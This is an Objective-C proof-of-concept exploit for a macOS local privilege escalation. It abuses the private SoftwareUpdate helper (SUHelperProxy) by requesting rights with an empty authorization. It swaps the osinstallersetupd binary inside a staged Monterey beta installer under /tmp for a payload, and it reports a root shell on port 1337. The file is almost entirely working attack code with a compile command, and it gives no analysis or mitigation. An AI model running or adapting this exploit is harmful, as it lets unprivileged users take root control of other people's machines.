///  clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Versions/A/SoftwareUpdate.tbd

#import <Foundation/Foundation.h>

@protocol SUHelperDProtocol
// some protocol methods
@end

@interface SUHelperProxy : NSObject <SUHelperDProtocol>
{
    unsigned int _suhelperd_port;
    unsigned int _client_port;
    long long _currentRights;
    NSObject<OS_dispatch_queue> *_q;
    NSObject<OS_dispatch_source> *clientPortDeadChecker;
    long long _recentRights;
}

+ (id)sharedHelperProxy;
@property long long recentRights; // @synthesize recentRights=_recentRights;
- (void)authorizeWithEmptyAuthorizationForRights:(long long)arg1;
- (BOOL) prepareInstallAssistantWithPath:(NSString *)arg1;
- (id) installAssistantPreparationStatus;

@end

int main(int argc, const char * argv[]) {
    if ([[NSFileManager defaultManager] fileExistsAtPath: @"/tmp/bin/osinstallersetupd"]) {
        printf("first time running, preparing payload shell...\n");
        rename("/tmp/Applications/Install macOS Monterey beta.app/Contents/Frameworks/OSInstallerSetup.framework/Resources/osinstallersetupd", "/tmp/Applications/Install macOS Monterey beta.app/Contents/Frameworks/OSInstallerSetup.framework/Resources/osinstallersetupd.bak");
        rename("/tmp/bin/osinstallersetupd", "/tmp/Applications/Install macOS Monterey beta.app/Contents/Frameworks/OSInstallerSetup.framework/Resources/osinstallersetupd");
    }

    SUHelperProxy *helper = [SUHelperProxy sharedHelperProxy];
    [helper authorizeWithEmptyAuthorizationForRights:4];
    
    id status = [helper installAssistantPreparationStatus];
    NSLog(@"installAssistantPreparationStatus:%@", status);
    [helper prepareInstallAssistantWithPath:@"/tmp/Applications/Install macOS Monterey beta.app"];

    printf("rootshell launched, connect to port 1337\n");
    
    return 0;
}
